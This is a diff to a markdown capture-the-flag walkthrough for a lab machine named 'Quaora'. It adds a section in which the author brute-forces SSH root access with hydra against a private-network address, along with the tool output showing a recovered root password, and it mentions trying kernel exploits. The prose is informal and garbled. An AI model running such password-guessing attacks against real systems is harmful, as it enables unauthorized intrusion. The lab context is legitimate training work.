@@ -909,9 +909,33 @@ mysql>
 
 ```
 
-## Root
-oooh! it take me time try most of the kernel exploits and try to get the access as the root in the target but oooh sheet never forget to the spay password get in the database that give me the root access sheet
+## Have a ride.
+oooh! it take me time try most of the kernel exploits and try to get the access as the root in the target but oooh sheet never forget to the spay password get in the database that give me the root access sheet. Make sure you try to create your own password this i how we gain initial access to root simple right.
 
+```
+~/Desktop/redteam/hack/Quaora » hydra -l root -P pass.txt ssh://192.168.56.114                    cyberkid@cyberkiddle
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-09 15:04:28
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 237 login tries (l:1/p:237), ~15 tries per task
+[DATA] attacking ssh://192.168.56.114:22/
+[22][ssh] host: 192.168.56.114   login: root   password: rootpassword!
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 6 final worker threads did not complete until end.
+[ERROR] 6 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-09 15:04:41
+-----------------------------------------------------------------------------------------------------------------------
+~/Desktop/redteam/hack/Quaora » wc pass.txt                                                 255 ↵ cyberkid@cyberkiddle
+ 237  237 1561 pass.txt
+-----------------------------------------------------------------------------------------------------------------------
+~/Desktop/redteam/hack/Quaora »                                                                   cyberkid@cyberkiddle
+
+
+```
+## Root
+Boom! bing bang! 
 ```
 ~/Desktop/redteam/hack/Quaora » ssh root@192.168.56.114                                       1 ↵ cyberkid@cyberkiddle
 The authenticity of host '192.168.56.114 (192.168.56.114)' can't be established.
